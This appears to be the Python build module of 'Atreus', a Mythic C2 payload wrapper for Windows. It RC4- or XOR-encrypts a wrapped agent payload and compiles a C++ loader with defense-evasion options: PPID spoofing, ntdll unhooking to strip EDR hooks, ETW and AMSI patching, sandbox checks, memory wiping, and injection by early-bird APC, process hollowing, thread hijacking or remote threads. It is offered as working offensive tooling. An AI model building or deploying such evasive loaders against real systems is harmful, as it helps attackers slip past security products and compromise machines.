from mythic_container.PayloadBuilder import *
import sys
import os
import logging
import subprocess
import tempfile
import random
import string
import pathlib


def _rc4(key: bytes, data: bytes) -> bytes:
    S = list(range(256))
    j = 0
    for i in range(256):
        j = (j + S[i] + key[i % len(key)]) & 0xFF
        S[i], S[j] = S[j], S[i]
    x = j = 0
    out = []
    for b in data:
        x = (x + 1) & 0xFF
        j = (j + S[x]) & 0xFF
        S[x], S[j] = S[j], S[x]
        out.append(b ^ S[(S[x] + S[j]) & 0xFF])
    return bytes(out)


def _str_to_wchar_array(s: str) -> str:
    """Convert a string to a C wchar_t array literal: L'C',L':',...,L'\0'"""
    chars = [f"L'\\x{ord(c):04x}'" for c in s]
    chars.append("L'\\0'")
    return ", ".join(chars)


class Atreus(PayloadType):
    name = "atreus"
    file_extension = "exe"
    author = "@goultarde"
    supported_os = [SupportedOS.Windows]
    wrapper = True
    wrapped_payloads = []
    supports_dynamic_loading = False
    mythic_encrypts = True
    build_parameters = [
        BuildParameter(
            name="encryption_type",
            parameter_type=BuildParameterType.ChooseOne,
            description="Payload encryption",
            choices=["rc4", "xor", "none"],
            default_value="rc4",
        ),
        BuildParameter(
            name="encryption_key",
            parameter_type=BuildParameterType.String,
            description="Encryption key (leave empty for random 16-byte key)",
            default_value="",
            required=False,
        ),
        BuildParameter(
            name="target_process",
            parameter_type=BuildParameterType.String,
            description="Target process: full path for early_bird/hollow/thread_hijacking (e.g. C:\\Windows\\System32\\notepad.exe), process name for remote_thread (e.g. svchost.exe)",
            default_value="C:\\Windows\\System32\\notepad.exe",
        ),
        BuildParameter(
            name="ppid_spoof",
            parameter_type=BuildParameterType.Boolean,
            description="PPID spoof: make process appear as explorer.exe child",
            default_value=True,
        ),
        BuildParameter(
            name="use_unhook",
            parameter_type=BuildParameterType.Boolean,
            description="Remap ntdll .text from disk to remove EDR hooks before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_etw_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch EtwEventWrite (xor eax,eax; ret) before injection",
            default_value=True,
        ),
        BuildParameter(
            name="use_amsi_patch",
            parameter_type=BuildParameterType.Boolean,
            description="Patch AmsiScanBuffer before injection",
            default_value=False,
        ),
        BuildParameter(
            name="use_sandbox_check",
            parameter_type=BuildParameterType.Boolean,
            description="Basic sandbox detection (uptime, RAM, CPU count, sleep skipping)",
            default_value=True,
        ),
        BuildParameter(
            name="injection_technique",
            parameter_type=BuildParameterType.ChooseOne,
            description="Injection technique: Early Bird APC (new suspended process), Thread Hijack (RIP redirect), Process Hollowing (unmap + RIP), or Remote Thread (NtCreateThreadEx in existing process - target_process must be a process name like svchost.exe)",
            choices=["self_injection", "fiber_injection", "remote_injection", "thread_hijacking", "early_bird_apc", "process_hollowing"],
            default_value="early_bird_apc",
        ),
        BuildParameter(
            name="wipe_memory",
            parameter_type=BuildParameterType.Boolean,
            description="Zero payload in heap after injection",
            default_value=True,
        ),
        BuildParameter(
            name="debug_mode",
            parameter_type=BuildParameterType.Boolean,
            description="Debug mode: MessageBox at each injection step (do NOT use in production)",
            default_value=False,
        ),
    ]

    agent_code_path = pathlib.Path(__file__).parent.parent / "agent_code"
    agent_icon_path = pathlib.Path(__file__).parent.parent / "agent_icons" / "atreus.svg"

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Error)

        payload_bytes = self.wrapped_payload
        if not payload_bytes:
            resp.error_message = "No payload received from Kratos builder"
            return resp

        enc_type         = self.get_parameter("encryption_type") or "rc4"
        enc_key_param    = (self.get_parameter("encryption_key") or "").strip()
        target_process   = (self.get_parameter("target_process") or "C:\\Windows\\System32\\notepad.exe").strip()
        ppid_spoof       = self.get_parameter("ppid_spoof") or False
        use_unhook       = self.get_parameter("use_unhook") or False
        use_etw_patch    = self.get_parameter("use_etw_patch") or False
        use_amsi_patch   = self.get_parameter("use_amsi_patch") or False
        use_sandbox      = self.get_parameter("use_sandbox_check") or False
        injection_technique = self.get_parameter("injection_technique") or "early_bird_apc"
        wipe_memory      = self.get_parameter("wipe_memory") or False
        debug_mode       = self.get_parameter("debug_mode") or False

        # Generate key
        key_bytes = enc_key_param.encode() if enc_key_param else \
                    bytes(random.getrandbits(8) for _ in range(16))

        # Encrypt payload
        if enc_type == "rc4":
            encrypted = _rc4(key_bytes, payload_bytes)
            payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
            rc4_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
            xor_key_bytes  = "0x00"
        elif enc_type == "xor":
            encrypted = bytes(payload_bytes[i] ^ key_bytes[i % len(key_bytes)]
                              for i in range(len(payload_bytes)))
            payload_hex    = ", ".join(f"0x{b:02x}" for b in encrypted)
            rc4_key_bytes  = "0x00"
            xor_key_bytes  = ", ".join(f"0x{b:02x}" for b in key_bytes)
        else:
            payload_hex    = ", ".join(f"0x{b:02x}" for b in payload_bytes)
            rc4_key_bytes  = "0x00"
            xor_key_bytes  = "0x00"

        # Target process as wchar array (no string literal in binary)
        target_wchar = _str_to_wchar_array(target_process)

        # Read template
        template_path = self.agent_code_path / "Atreus_Main.cpp"
        if not template_path.exists():
            resp.error_message = f"Template not found: {template_path.absolute()}"
            return resp

        src = template_path.read_text()
        src = src.replace("%PAYLOAD%",          payload_hex)
        src = src.replace("%RC4_KEY%",          rc4_key_bytes)
        src = src.replace("%XOR_KEY_BYTES%",    xor_key_bytes)
        src = src.replace("%TARGET_PROCESS_W%", target_wchar)

        # Build defines
        defines = []
        if enc_type == "rc4":
            defines.append("-DUSE_RC4")
        elif enc_type == "xor":
            defines.append("-DUSE_XOR")
        if ppid_spoof:
            defines.append("-DUSE_PPID_SPOOF")
        if use_unhook:
            defines.append("-DUSE_UNHOOK")
        if use_etw_patch:
            defines.append("-DUSE_ETW_PATCH")
        if use_amsi_patch:
            defines.append("-DUSE_AMSI_PATCH")
        if use_sandbox:
            defines.append("-DUSE_SANDBOX_CHECK")
        if injection_technique == "thread_hijacking":
            defines.append("-DUSE_THREAD_HIJACK")
        elif injection_technique == "process_hollowing":
            defines.append("-DUSE_HOLLOW")
        elif injection_technique == "remote_injection":
            defines.append("-DUSE_REMOTE_THREAD")
        elif injection_technique == "self_injection":
            defines.append("-DUSE_SELF_INJECT")
        elif injection_technique == "fiber_injection":
            defines.append("-DUSE_FIBER_INJECT")
        if wipe_memory:
            defines.append("-DUSE_WIPE")

        extra_libs = ""
        if debug_mode:
            defines.append("-DATREUS_DEBUG")

        # DEBUG: log raw parameter value and final defines
        raw_inj = self.get_parameter("injection_technique")
        logging.error(f"[ATREUS-DEBUG] raw injection_technique = {repr(raw_inj)}")
        logging.error(f"[ATREUS-DEBUG] resolved injection_technique = {repr(injection_technique)}")
        logging.error(f"[ATREUS-DEBUG] defines = {defines}")

        with tempfile.TemporaryDirectory() as tmp:
            src_path = os.path.join(tmp, "Atreus_Main.cpp")
            exe_path = os.path.join(tmp, "Atreus.exe")
            with open(src_path, "w") as f:
                f.write(src)

            if debug_mode:
                subsystem = ""       # console subsystem - main() entry point
                opt_flags = "-O0"    # no strip, no optim for readability
            else:
                subsystem = "-mwindows -s"
                opt_flags = "-O2"
            cmd = (
                f"x86_64-w64-mingw32-g++ {src_path} -o {exe_path} "
                f"-std=c++17 {opt_flags} {subsystem} -lntdll -static "
                f"-fno-exceptions -fno-rtti -w "
                f"{' '.join(defines)} {extra_libs}"
            )
            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = proc.communicate()

            if proc.returncode != 0:
                resp.error_message = (
                    f"Atreus compilation failed\n"
                    f"Command: {cmd}\n"
                    f"StdErr: {stderr.decode()}\n"
                    f"StdOut: {stdout.decode()}"
                )
                return resp

            with open(exe_path, "rb") as f:
                resp.payload = f.read()
                resp.status  = BuildStatus.Success

                features = [enc_type.upper()]
                if ppid_spoof:       features.append("PPID-spoof")
                if use_unhook:       features.append("unhook-ntdll")
                if use_etw_patch:    features.append("ETW-patch")
                if use_amsi_patch:   features.append("AMSI-patch")
                if use_sandbox:      features.append("sandbox-check")
                if injection_technique == "thread_hijacking":    features.append("thread-hijacking")
                elif injection_technique == "process_hollowing": features.append("process-hollowing")
                elif injection_technique == "remote_injection":  features.append("remote-injection")
                elif injection_technique == "self_injection":    features.append("self-injection")
                elif injection_technique == "fiber_injection":   features.append("fiber-injection")
                else:                                            features.append("early-bird-apc")
                if wipe_memory:      features.append("wipe")
                if debug_mode:       features.append("DEBUG")
                resp.message = (
                    f"Atreus [{', '.join(features)}] -> {target_process}\n"
                    f"[DBG] raw_param={repr(raw_inj)} resolved={repr(injection_technique)}\n"
                    f"[DBG] defines={' '.join(defines)}"
                )

        return resp
